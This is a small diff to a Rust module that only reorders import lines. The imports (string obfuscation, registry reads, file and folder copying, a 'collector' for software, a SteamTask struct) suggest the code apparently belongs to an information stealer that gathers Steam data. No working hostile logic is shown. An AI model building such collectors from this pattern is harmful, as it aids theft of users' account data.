@@ -2,10 +2,10 @@ use crate::alloc::borrow::ToOwned;
 use collector::{Collector, Software};
 use filesystem::path::Path;
 use filesystem::storage::StorageFileSystem;
-use filesystem::{copy_file, copy_folder, FileSystem};
+use filesystem::{FileSystem, copy_file, copy_folder};
 use obfstr::obfstr as s;
-use regedit::{read_registry_value, RegistryValue};
-use tasks::{parent_name, Task};
+use regedit::{RegistryValue, read_registry_value};
+use tasks::{Task, parent_name};
 use windows_sys::Win32::System::Registry::HKEY_CURRENT_USER;
 
 pub(crate) struct SteamTask;
